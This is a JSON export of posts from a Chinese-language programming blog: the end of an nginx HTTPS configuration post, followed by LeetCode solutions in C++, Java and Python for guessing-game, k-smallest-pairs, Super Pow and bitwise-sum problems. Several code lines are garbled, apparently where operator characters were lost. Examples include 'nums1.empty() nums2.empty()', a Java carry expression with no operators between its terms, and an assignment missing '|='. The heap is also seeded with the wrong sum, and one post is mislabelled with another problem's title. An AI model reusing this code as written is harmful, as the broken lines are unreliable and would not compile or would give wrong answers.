&#x2F;etc&#x2F;ssl&#x2F;private&#x2F;1_www.hrwhisper.me_bundle.crt; ssl_certificate_key &#x2F;etc&#x2F;ssl&#x2F;private&#x2F;2_www.hrwhisper.me.key; # ssl_session_timeout 5m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS; ssl_prefer_server_ciphers on; #enable HSTS including subdomains add_header Strict-Transport-Security &quot;max-age&#x3D;31536000; includeSubdomains&quot;; charset utf-8; access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log main; # Load configuration files for the default server block. include &#x2F;etc&#x2F;nginx&#x2F;default.d&#x2F;*.conf; location &#x2F; &#123; root &#x2F;var&#x2F;www&#x2F;html; index index.php index.html index.htm; if (-f $request_filename&#x2F;index.html)&#123; rewrite (.*) $1&#x2F;index.html break; &#125; if (-f $request_filename&#x2F;index.php)&#123; rewrite (.*) $1&#x2F;index.php; &#125; if (!-f $request_filename)&#123; rewrite (.*) &#x2F;index.php; &#125; &#125; error_page 404 &#x2F;404.html; location &#x3D; &#x2F;404.html &#123; root &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html; &#125; # redirect server error pages to the static page &#x2F;50x.html # error_page 500 502 503 504 &#x2F;50x.html; location &#x3D; &#x2F;50x.html &#123; root &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html; &#125; # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \\.php$ &#123; # proxy_pass http:&#x2F;&#x2F;127.0.0.1; #&#125; # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # location ~ \\.php$ &#123; root &#x2F;var&#x2F;www&#x2F;html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125; # deny access to .htaccess files, if Apache&#39;s document root # concurs with nginx&#39;s one # #location ~ &#x2F;\\.ht &#123; # deny all; #&#125;&#125; 参考资料 How To Install Linux, nginx, MySQL, PHP (LEMP) stack on CentOS 6 How To Install Wordpress with nginx on CentOS 6 Nginx下WordPress的Rewrite 加速nginx: 开启gzip和缓存","categories":[{"name":"others","slug":"others","permalink":"https://www.hrwhisper.me/categories/others/"},{"name":"建站经验","slug":"others/建站经验","permalink":"https://www.hrwhisper.me/categories/others/%E5%BB%BA%E7%AB%99%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.hrwhisper.me/tags/HTTPS/"},{"name":"wordpress","slug":"wordpress","permalink":"https://www.hrwhisper.me/tags/wordpress/"},{"name":"Centos","slug":"Centos","permalink":"https://www.hrwhisper.me/tags/Centos/"},{"name":"Linux","slug":"Linux","permalink":"https://www.hrwhisper.me/tags/Linux/"}]},{"title":"leetcode Guess Number Higher or Lower II","slug":"leetcode-guess-number-higher-lower-ii","date":"2016-07-16T08:39:15.000Z","updated":"2021-01-08T13:32:16.848Z","comments":true,"path":"leetcode-guess-number-higher-lower-ii/","link":"","permalink":"https://www.hrwhisper.me/leetcode-guess-number-higher-lower-ii/","excerpt":"leetcode Guess Number Higher or Lower II We are playing the Guess Game. The game is as follows: I pick a number from 1 to n. You have to guess which number I picked. Every time you guess wrong, I'll tell you whether the number I picked is higher or lower. However, when you guess a particular number x, and you guess wrong, you pay $x. You win the game when you guess the number I picked. Example: 123456789n &#x3D; 10, I pick 8.First round: You guess 5, I tell you that it&#39;s higher. You pay $5.Second round: You guess 7, I tell you that it&#39;s higher. You pay $7.Third round: You guess 9, I tell you that it&#39;s lower. You pay $9.Game over. 8 is the number I picked.You end up paying $5 + $7 + $9 &#x3D; $21. Given a particular n ≥ 1, find out how much money you need to have to guarantee a win. Hint: The best strategy to play the game is to minimize the maximum loss you could possibly face. Another strategy is to minimize the expected loss. Here, we are interested in the first scenario. Take a small example (n = 3). What do you end up paying in the worst case? Check out this article if you're still stuck. The purely recursive implementation of minimax would be worthless for even a small n. You MUST use dynamic programming. As a follow-up, how would you modify your code to solve the problem of minimizing the expected loss, instead of the worst-case loss?","text":"leetcode Guess Number Higher or Lower II We are playing the Guess Game. The game is as follows: I pick a number from 1 to n. You have to guess which number I picked. Every time you guess wrong, I'll tell you whether the number I picked is higher or lower. However, when you guess a particular number x, and you guess wrong, you pay $x. You win the game when you guess the number I picked. Example: 123456789n &#x3D; 10, I pick 8.First round: You guess 5, I tell you that it&#39;s higher. You pay $5.Second round: You guess 7, I tell you that it&#39;s higher. You pay $7.Third round: You guess 9, I tell you that it&#39;s lower. You pay $9.Game over. 8 is the number I picked.You end up paying $5 + $7 + $9 &#x3D; $21. Given a particular n ≥ 1, find out how much money you need to have to guarantee a win. Hint: The best strategy to play the game is to minimize the maximum loss you could possibly face. Another strategy is to minimize the expected loss. Here, we are interested in the first scenario. Take a small example (n = 3). What do you end up paying in the worst case? Check out this article if you're still stuck. The purely recursive implementation of minimax would be worthless for even a small n. You MUST use dynamic programming. As a follow-up, how would you modify your code to solve the problem of minimizing the expected loss, instead of the worst-case loss? 题目地址: leetcode Guess Number Higher or Lower II 题意：给定一个数字n，从1~n中选取一个数字y让你猜。在猜的过程中，会告诉你你当前猜的数字x是比y大还是小，猜错的话，需要付$x。给定n,我们最少需要多少的钱来确保我们猜出y呢？ 思路：在 374 Guess Number Higher or Lower 中，我们采用二分法来进行查找，但这题并不是用二分法。 这题要求我们在猜测数字y未知的情况下（1~n任意一个数），要我们在最坏情况下我们支付最少的钱。也就是说要考虑所有y的情况。 我们假定选择了一个错误的数x，（1&lt;=x&lt;=n &amp;&amp; x!=y ）那么就知道接下来应该从[1,x-1 ] 或者[x+1,n]中进行查找。 假如我们已经解决了[1,x-1] 和 [x+1,n]计算问题，我们将其表示为solve(L,x-1) 和solve(x+1,n)，那么我们应该选择max(solve(L,x-1),solve(x+1,n)) 这样就是求最坏情况下的损失。总的损失就是f(x) = x + max(solve(L,x-1),solve(x+1,n)) 那么将x从1~n进行遍历，取使得 f(x) 达到最小，来确定最坏情况下最小的损失，也就是我们初始应该选择哪个数。 上面的说法其实是一个自顶向下的过程（Top-down），可以用递归来解决。很容易得到如下的代码（这里用了记忆化搜索）： C++ 1234567891011121314151617class Solution &#123;public: int getMoneyAmount(int n) &#123; vector&lt;vector&lt;int&gt;&gt; dp(n + 1, vector&lt;int&gt;(n + 1, 0)); return solve(dp, 1, n); &#125; int solve(vector&lt;vector&lt;int&gt;&gt; &amp;dp, int L, int R) &#123; if (L &gt;= R) return 0; if (dp[L][R]) return dp[L][R]; dp[L][R] = 0x7FFFFFFF; for (int i = L; i &lt;= R; i++) &#123; dp[L][R] = min(dp[L][R], i + max(solve(dp,L,i-1),solve(dp,i+1,R))); &#125; return dp[L][R]; &#125;&#125;; Java 123456789101112131415public class Solution &#123; public int getMoneyAmount(int n) &#123; int[][] dp = new int[n+1][n+1]; return solve(dp, 1, n); &#125; int solve(int[][] dp, int L, int R) &#123; if (L &gt;= R) return 0; if (dp[L][R] != 0) return dp[L][R]; dp[L][R] = 0x7FFFFFFF; for (int i = L; i &lt;= R; i++) &#123; dp[L][R] = Math.min(dp[L][R], i + Math.max(solve(dp,L,i-1),solve(dp,i+1,R))); &#125; return dp[L][R]; &#125;&#125; Python 1234567891011121314class Solution(object): def getMoneyAmount(self, n): &quot;&quot;&quot; :type n: int :rtype: int &quot;&quot;&quot; dp = [[0] * (n + 1) for _ in range(n + 1)] return self.solve(dp, 1, n) def solve(self, dp, L, R): if L &gt;= R: return 0 if dp[L][R]: return dp[L][R] dp[L][R] = min(i + max(self.solve(dp, L, i - 1), self.solve(dp, i + 1, R)) for i in range(L, R + 1)) return dp[L][R] 打印路径 我们可以将路径打印出来，来看看具体的选择策略的过程，以便加深理解： 123456789101112131415161718192021222324252627class Solution(object): def getMoneyAmount(self, n): &quot;&quot;&quot; :type n: int :rtype: int &quot;&quot;&quot; dp = [[0] * (n + 1) for _ in range(n + 1)] self.solve(dp, 1, n) self.print_path(dp, 1, n) return dp[1][n] def solve(self, dp, L, R): if L &gt;= R: return 0 if dp[L][R]: return dp[L][R] dp[L][R] = min(i + max(self.solve(dp, L, i - 1), self.solve(dp, i + 1, R)) for i in range(L, R + 1)) return dp[L][R] def print_path(self, dp, L, R): if L &gt;= R: return for i in range(L, R + 1): if dp[L][R] == i + max(dp[L][i - 1], dp[i + 1][R]): print i if dp[L][i - 1] &gt; dp[i + 1][R]: self.print_path(dp, L, i - 1) else: self.print_path(dp, i + 1, R) break 比如n = 10的时候， 上述程序输出7，9 说明第一步选7第二步选9这是最坏的情况。 有没有更坏的情况呢？答案是没有。7的右半边[8，10]最坏情况就是9了。7的左半边[1,6]可以选个3，然后选个5达到最坏的情况。3+5=8&lt;9 迭代的方法 在记忆化搜索的解法中，c++ 88ms, java 15ms, 而Python则高达1800ms，差点TLE，确实效率不高。 于是将其改为迭代如下： C++ 56ms 123456789101112131415class Solution &#123;public: int getMoneyAmount(int n) &#123; vector&lt;vector&lt;int&gt;&gt; dp(n + 1, vector&lt;int&gt;(n + 1, 0)); for (int L &#x3D; n - 1; L &gt; 0; L--) &#123; for (int R &#x3D; L + 1; R &lt;&#x3D; n; R++) &#123; dp[L][R] &#x3D; 0x7FFFFFFF; &#x2F;&#x2F;INT_MAX for (int i &#x3D; L; i &lt; R; i++) &#123; dp[L][R] &#x3D; min(dp[L][R], i + max(dp[L][i - 1], dp[i + 1][R])); &#125; &#125; &#125; return dp[1][n]; &#125;&#125;; Java 14ms 1234567891011121314public class Solution &#123; public int getMoneyAmount(int n) &#123; int[][] dp = new int[n+1][n+1]; for (int L = n - 1; L &gt; 0; L--) &#123; for (int R = L + 1; R &lt;= n; R++) &#123; dp[L][R] = 0x7FFFFFFF; //INT_MAX for (int i = L; i &lt; R; i++) &#123; dp[L][R] = Math.min(dp[L][R], i + Math.max(dp[L][i - 1], dp[i + 1][R])); &#125; &#125; &#125; return dp[1][n]; &#125;&#125; Python 576ms 1234567891011class Solution(object): def getMoneyAmount(self, n): &quot;&quot;&quot; :type n: int :rtype: int &quot;&quot;&quot; dp = [[0] * (n + 1) for _ in range(n + 1)] for L in range(n - 1, 0, -1): for R in range(L + 1, n + 1): dp[L][R] = min(i + max(dp[L][i - 1], dp[i + 1][R]) for i in range(L, R)) return dp[1][n] 本题是leetcode 375 Guess Number Higher or Lower II 题解 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"dynamic programming","slug":"dynamic-programming","permalink":"https://www.hrwhisper.me/tags/dynamic-programming/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"leetcode Guess Number Higher or Lower","slug":"leetcode-guess-number-higher-lower","date":"2016-07-13T05:37:43.000Z","updated":"2021-01-08T13:32:16.848Z","comments":true,"path":"leetcode-guess-number-higher-lower/","link":"","permalink":"https://www.hrwhisper.me/leetcode-guess-number-higher-lower/","excerpt":"leetcode Guess Number Higher or Lower We are playing the Guess Game. The game is as follows: I pick a number from 1 to n. You have to guess which number I picked. Every time you guess wrong, I'll tell you whether the number is higher or lower. You call a pre-defined API guess(int num) which returns 3 possible results (-1, 1, or 0): 123-1 : My number is lower 1 : My number is higher 0 : Congrats! You got it! Example: 123n &#x3D; 10, I pick 6.Return 6.","text":"leetcode Guess Number Higher or Lower We are playing the Guess Game. The game is as follows: I pick a number from 1 to n. You have to guess which number I picked. Every time you guess wrong, I'll tell you whether the number is higher or lower. You call a pre-defined API guess(int num) which returns 3 possible results (-1, 1, or 0): 123-1 : My number is lower 1 : My number is higher 0 : Congrats! You got it! Example: 123n &#x3D; 10, I pick 6.Return 6. 题目地址：leetcode Guess Number Higher or Lower 题意：猜数字，给定一个数n，要你调用guess函数，来判断你猜的n和对方的值是否一样。 思路：就是二分搜索嘛。。。。没什么好说的 C++ 12345678910111213141516171819// Forward declaration of guess API.// @param num, your guess// @return -1 if my number is lower, 1 if my number is higher, otherwise return 0int guess(int num);class Solution &#123;public: int guessNumber(int n) &#123; int L = 1,R = n; while(L&lt;=R)&#123; int mid = L + ((R - L) &gt;&gt; 1); int res = guess(mid); if(res == 0) return mid; else if(res == 1) L = mid + 1; else R = mid - 1; &#125; return L; &#125;&#125;; Java 123456789101112131415161718/* The guess API is defined in the parent class GuessGame. @param num, your guess @return -1 if my number is lower, 1 if my number is higher, otherwise return 0 int guess(int num); */public class Solution extends GuessGame &#123; public int guessNumber(int n) &#123; int L = 1,R = n; while(L &lt;= R)&#123; int mid = L + ((R - L) &gt;&gt; 1); int res = guess(mid); if(res == 0) return mid; else if(res == 1) L = mid + 1; else R = mid - 1; &#125; return L; &#125;&#125; Python 12345678910111213141516171819202122# The guess API is already defined for you.# @param num, your guess# @return -1 if my number is lower, 1 if my number is higher, otherwise return 0# def guess(num):class Solution(object): def guessNumber(self, n): &quot;&quot;&quot; :type n: int :rtype: int &quot;&quot;&quot; L, R = 1, n while L &lt;= R: mid = L + ((R - L) &gt;&gt; 1) res = guess(mid) if res == 0: return mid elif res == 1: L = mid + 1 else: R = mid - 1 return L 本题是leetcode 374 Guess Number Higher or Lower题解 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"leetcode Find K Pairs with Smallest Sums","slug":"leetcode-find-k-pairs-smallest-sums","date":"2016-07-07T08:27:29.000Z","updated":"2021-01-08T13:32:16.839Z","comments":true,"path":"leetcode-find-k-pairs-smallest-sums/","link":"","permalink":"https://www.hrwhisper.me/leetcode-find-k-pairs-smallest-sums/","excerpt":"leetcode Find K Pairs with Smallest Sums You are given two integer arrays nums1 and nums2 sorted in ascending order and an integer k. Define a pair (u,v) which consists of one element from the first array and one element from the second array. Find the k pairs (u1,v1),(u2,v2) ...(uk,vk) with the smallest sums. Example 1: 123456Given nums1 &#x3D; [1,7,11], nums2 &#x3D; [2,4,6], k &#x3D; 3Return: [1,2],[1,4],[1,6]The first 3 pairs are returned from the sequence:[1,2],[1,4],[1,6],[7,2],[7,4],[11,2],[7,6],[11,4],[11,6] Example 2: 123456Given nums1 &#x3D; [1,1,2], nums2 &#x3D; [1,2,3], k &#x3D; 2Return: [1,1],[1,1]The first 2 pairs are returned from the sequence:[1,1],[1,1],[1,2],[2,1],[1,2],[2,2],[1,3],[1,3],[2,3] Example 3: 123456Given nums1 &#x3D; [1,2], nums2 &#x3D; [3], k &#x3D; 3 Return: [1,3],[2,3]All possible pairs are returned from the sequence:[1,3],[2,3]","text":"leetcode Find K Pairs with Smallest Sums You are given two integer arrays nums1 and nums2 sorted in ascending order and an integer k. Define a pair (u,v) which consists of one element from the first array and one element from the second array. Find the k pairs (u1,v1),(u2,v2) ...(uk,vk) with the smallest sums. Example 1: 123456Given nums1 &#x3D; [1,7,11], nums2 &#x3D; [2,4,6], k &#x3D; 3Return: [1,2],[1,4],[1,6]The first 3 pairs are returned from the sequence:[1,2],[1,4],[1,6],[7,2],[7,4],[11,2],[7,6],[11,4],[11,6] Example 2: 123456Given nums1 &#x3D; [1,1,2], nums2 &#x3D; [1,2,3], k &#x3D; 2Return: [1,1],[1,1]The first 2 pairs are returned from the sequence:[1,1],[1,1],[1,2],[2,1],[1,2],[2,2],[1,3],[1,3],[2,3] Example 3: 123456Given nums1 &#x3D; [1,2], nums2 &#x3D; [3], k &#x3D; 3 Return: [1,3],[2,3]All possible pairs are returned from the sequence:[1,3],[2,3] 题目地址：leetcode Find K Pairs with Smallest Sums 题意：给定两个已排好序的数组，要求从两个数组中分别取出一个数，构成一个对，求所有能组成的对中，最小的K个。 思路： 最直接的思路是把全部的数都组合一下，然后维护一个大小为k的最大堆 这样复杂度O(mnlogk) 其实还可以维护一个最小堆，每次取出堆顶的元素，然后把该元素相邻结点加入进去。这样能保证最小。 C++ 12345678910111213141516171819202122232425262728293031323334353637383940struct Order &#123; int sum; int index1, index2; Order(int a, int b, int sum) : index1(a), index2(b), sum(sum) &#123;&#125; bool operator &lt; (const Order&amp; b) const &#123; return sum &gt; b.sum; &#125;&#125;;int dx[] = &#123; 1,0 &#125;;int dy[] = &#123; 0,1 &#125;;class Solution &#123;public: vector&lt;pair&lt;int, int&gt;&gt; kSmallestPairs(vector&lt;int&gt;&amp; nums1, vector&lt;int&gt;&amp; nums2, int k) &#123; vector&lt;pair&lt;int, int&gt;&gt; ans; if (nums1.empty() || nums2.empty()) return ans; int n = nums1.size(), m = nums2.size(); vector&lt;vector&lt;bool&gt;&gt; vis(n, vector&lt;bool&gt;(m, false)); priority_queue&lt;Order&gt; q; q.push(Order(0, 0, nums1[0] + nums1[1])); vis[0][0] = true; while (k &gt; 0 &amp;&amp; !q.empty()) &#123; Order cur = q.top(); q.pop(); k--; int x = cur.index1, y = cur.index2; ans.push_back(make_pair(nums1[x], nums2[y])); for (int i = 0; i &lt; 2; i++) &#123; int nx = x + dx[i], ny = y + dy[i]; if (nx &lt; n &amp;&amp; ny &lt; m &amp;&amp; !vis[nx][ny]) &#123; q.push(Order(nx, ny, nums1[nx] + nums2[ny])); vis[nx][ny] = true; &#125; &#125; &#125; return ans; &#125;&#125;; 更好的写法，先将nums1中每个数和nums2的第一个数放进堆，这样，每次从堆中取cur，下一个取cur.i和cur.j+1下标位置的即可 123456789101112131415161718192021222324252627struct Node&#123; int sum, i, j; Node(int sum, int i, int j):sum(sum), i(i), j(j)&#123;&#125; bool operator &lt; (const Node &amp;b) const&#123; return sum &gt; b.sum; &#125;&#125;;class Solution &#123;public: vector&lt;pair&lt;int, int&gt;&gt; kSmallestPairs(vector&lt;int&gt;&amp; nums1, vector&lt;int&gt;&amp; nums2, int k) &#123; vector&lt;pair&lt;int, int&gt;&gt; ans; if(nums1.empty() nums2.empty()) return ans; priority_queue&lt;Node&gt; q; for(int i = 0; i &lt; k &amp;&amp; i &lt; nums1.size(); ++i) q.push(Node(nums1[i] + nums2[0], i, 0)); while(k-- &amp;&amp; !q.empty())&#123; Node cur = q.top(); q.pop(); ans.push_back(make_pair(nums1[cur.i], nums2[cur.j])); if(cur.j + 1 &lt; nums2.size()) q.push(Node(nums1[cur.i] + nums2[cur.j + 1], cur.i, cur.j + 1)); &#125; return ans; &#125;&#125;; 本题是leetcode 373 Find K Pairs with Smallest Sums 题解 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Super Pow","slug":"leetcode-super-pow","date":"2016-07-07T07:14:02.000Z","updated":"2021-01-08T13:32:16.871Z","comments":true,"path":"leetcode-super-pow/","link":"","permalink":"https://www.hrwhisper.me/leetcode-super-pow/","excerpt":"leetcode Super Pow Your task is to calculate \\(a^b\\) mod 1337​ where a is a positive integer and b is an extremely large positive integer given in the form of an array. Example1: 1234a &#x3D; 2b &#x3D; [3]Result: 8 Example2: 1234a &#x3D; 2b &#x3D; [1,0]Result: 1024","text":"leetcode Super Pow Your task is to calculate \\(a^b\\) mod 1337​ where a is a positive integer and b is an extremely large positive integer given in the form of an array. Example1: 1234a &#x3D; 2b &#x3D; [3]Result: 8 Example2: 1234a &#x3D; 2b &#x3D; [1,0]Result: 1024 题目地址：leetcode Super Pow 题意：给定数a和用数组表示的一个很大的数b，求a^b % 1337 思路： 一个数e可以写成如下形式： \\[ e=\\sum _{i=0}^{n-1}a_{i}2^{i} \\] 显然，对于b的e次方，有： \\[ b^{e}=b^{\\left(\\sum _{i=0}^{n-1}a_{i}2^{i}\\right)}=\\prod _{i=0}^{n-1}\\left(b^{2^{i}}\\right)^{a_{i}} \\] \\[ c\\equiv \\prod _{i=0}^{n-1}\\left(b^{2^{i}}\\right)^{a_{i}}\\ ({\\mbox{mod}}\\ m) \\] 此外，还有： c mod m = (a ⋅ b) mod m = [(a mod m) ⋅ (b mod m)] mod m 参照wiki :https://en.wikipedia.org/wiki/Modular_exponentiation 看懂了上面的式子后，回到此题，此题b用数组表示，其实就是把上面的数e的2改为10即可。 因此，用Python可以得到此题的写法为： 12345678910111213class Solution(object): def superPow(self, a, b): &quot;&quot;&quot; :type a: int :type b: List[int] :rtype: int &quot;&quot;&quot; ans = 1 mod = 1337 for bi in b[::-1]: ans = ans * a ** bi % mod a = a ** 10 % mod return ans 当然，我们可以用快速幂来加速 C++ 123456789101112131415161718192021222324class Solution &#123;private: int mod = 1337;public: int superPow(int a, vector&lt;int&gt;&amp; b) &#123; int n = b.size(); int ans = 1; for (int i = n - 1; i &gt;= 0; i--) &#123; ans = ans * quick_pow(a, b[i]) % mod; a = quick_pow(a, 10); &#125; return ans; &#125; inline int quick_pow(int a, int b) &#123; int ans = 1; a %= mod; while (b &gt; 0) &#123; if (b &amp; 1) ans = ans * a % mod; a = a * a %mod; b &gt;&gt;= 1; &#125; return ans; &#125;&#125;; Java 123456789101112131415161718192021222324public class Solution &#123; private int mod = 1337; public int superPow(int a, int[] b) &#123; int n = b.length; int ans = 1; for (int i = n - 1; i &gt;= 0; i--) &#123; ans = ans * quick_pow(a, b[i]) % mod; a = quick_pow(a, 10); &#125; return ans; &#125; int quick_pow(int a, int b) &#123; int ans = 1; a %= mod; while (b &gt; 0) &#123; if ((b &amp; 1) !=0) ans = ans * a % mod; a = a * a % mod; b &gt;&gt;= 1; &#125; return ans; &#125;&#125; 本题是leetcode 372 Sum of Two Integers 题解 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"leetcode Sum of Two Integers","slug":"leetcode-sum-two-integers","date":"2016-06-30T05:35:22.000Z","updated":"2021-01-08T13:32:16.870Z","comments":true,"path":"leetcode-sum-two-integers/","link":"","permalink":"https://www.hrwhisper.me/leetcode-sum-two-integers/","excerpt":"leetcode Sum of Two Integers Calculate the sum of two integers a and b, but you are not allowed to use the operator + and -. Example: Given a = 1 and b = 2, return 3.","text":"leetcode Sum of Two Integers Calculate the sum of two integers a and b, but you are not allowed to use the operator + and -. Example: Given a = 1 and b = 2, return 3. 传送门：leetcode Sum of Two Integers 题意：给定两个数 a和b，求它们的和。 要求不使用 +和-运算符 思路： 首先要知道，异或也被称为“模2和” ，so 这题就是运用异或的位运算啦。 我们可以每次取最低位来计算, 然后每次右移一位，注意点有： 进位为两个数字1 负数的情况下，右移最高位补的是1 ,因此值得注意要取到什么时候为止。 java有一个无符号右移&gt;&gt;&gt;高位补0，因此结束条件可以为a!=0 b!=0（然而进位会被忽略） C++ 123456789101112class Solution &#123;public: int getSum(int a, int b) &#123; int ans = 0, carry = 0; for (int i = 0; i &lt; 32; a &gt;&gt;= 1, b &gt;&gt;= 1, i++) &#123; int lower_a = a &amp; 1, lower_b = b &amp; 1; ans |= (lower_a ^ lower_b ^ carry) &lt;&lt; i; carry = (carry &amp; lower_a) | (carry &amp; lower_b) | (lower_a &amp; lower_b); &#125; return ans; &#125;&#125;; Java 1234567891011public class Solution &#123; public int getSum(int a, int b) &#123; int ans = 0, carry = 0; for (int i = 0; i &lt; 32; a &gt;&gt;&gt;= 1, b &gt;&gt;&gt;= 1, i++) &#123; int lower_a = a &amp; 1, lower_b = b &amp; 1; ans = (lower_a ^ lower_b ^ carry) &lt;&lt; i; carry = (carry &amp; lower_a) (carry &amp; lower_b) (lower_a &amp; lower_b); &#125; return ans; &#125;&#125; 第二种方法是直接进行异或操作。 a ^ b 直接算出a + b 每位上%2的结果， 进位的话可以直接 (a &amp; b)&lt;&lt;1得到（只有两个位均为1才会进位嘛，左移表示进到下一位啊） C++ 1234567891011class Solution &#123;public: int getSum(int a, int b) &#123; while (b != 0) &#123; int c = a &amp; b; //carry a ^= b; //add b = c &lt;&lt; 1; &#125; return a; &#125;&#125;; Java(和上面一样) 12345678910public class Solution &#123; public int getSum(int a, int b) &#123; while (b != 0) &#123; int c = a &amp; b; //carry a ^= b; //add b = c &lt;&lt; 1; &#125; return a; &#125;&#125; 也可以写成Oneline： 123456class Solution &#123;public: int getSum(int a, int b) &#123; return b == 0 ? a : getSum(a^b, (a&amp;b) &lt;&lt; 1); &#125;&#125;; PS: Python 表示一个数不止32位。。 Of course, Python doesn't use 8-bit numbers. It USED to use however many bits were native to your machine, but since that was non-portable, it has recently switched to using an INFINITE number of bits. Thus the number -5 is treated by bitwise operators as if it were written \"...1111111111111111111011\". 来自 https://wiki.python.org/moin/BitwiseOperators 因此。。做这题要保证两个数在正确的范围内（本题是int，32bit） 如何做到呢？我们知道32bit 可以表示的无符号整数位00xFFFFFFFF（全0全1） 因此，我们使用&amp;来保证该数是32bit. int的0和正整数范围为00x7FFFFFFF，int负数的范围为-0x80000000-1,因此，大于0x7FFFFFFF的其实是最高位为1（这是符号位）。这样算出来是把最高位不当成符号位，我们还需要对负数的情况进行修正。 在具体实现上，我们可以先 &amp;0x7FFFFFFF 然后取反，这样，-1变为-0x80000000(-2147483648) -2变为了-0x7FFFFFFF(-2147483647) ,因此，在^0x7FFFFFFF即可。。 123456789101112class Solution(object): def getSum(self, a, b): &quot;&quot;&quot; :type a: int :type b: int :rtype: int &quot;&quot;&quot; MOD = 0xFFFFFFFF MAX_INT = 0x7FFFFFFF while b != 0: a, b = (a ^ b) &amp; MOD, ((a &amp; b) &lt;&lt; 1) &amp; MOD return a if a &lt;= MAX_INT else ~(a &amp; MAX_INT) ^ MAX_INT 也可以看https://discuss.leetcode.com/topic/49900/python-solution/2 上的思路 或者更巧妙的用(~0 &lt;&lt; 31) a 即可，因为只需要把31位之后的全部置1, 感谢mach7提出 本题是leetcode 371 Sum of Two Integers 题解 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"leetcode Largest Divisible Subset","slug":"leetcode-largest-divisible-subset","date":"2016-06-27T15:40:44.000Z","updated":"2021-01-08T13:32:16.852Z","comments":true,"path":"leetcode-largest-divisible-subset/","link":"","permalink":"https://www.hrwhisper.me/leetcode-largest-divisible-subset/","excerpt":"leetcode Largest Divisible Subset Given a set of distinct positive integers, find the largest subset such that every pair (Si, Sj) of elements in this subset satisfies: Si % Sj = 0 or Sj% Si = 0. If there are multiple solutions, return any subset is fine. Example 1: 123nums: [1,2,3]Result: [1,2] (of course, [1,3] will also be ok) Example 2: 123nums: [1,2,4,8]Result: [1,2,4,8]","text":"leetcode Largest Divisible Subset Given a set of distinct positive integers, find the largest subset such that every pair (Si, Sj) of elements in this subset satisfies: Si % Sj = 0 or Sj% Si = 0. If there are multiple solutions, return any subset is fine. Example 1: 123nums: [1,2,3]Result: [1,2] (of course, [1,3] will also be ok) Example 2: 123nums: [1,2,4,8]Result: [1,2,4,8] 题目地址：leetcode Largest 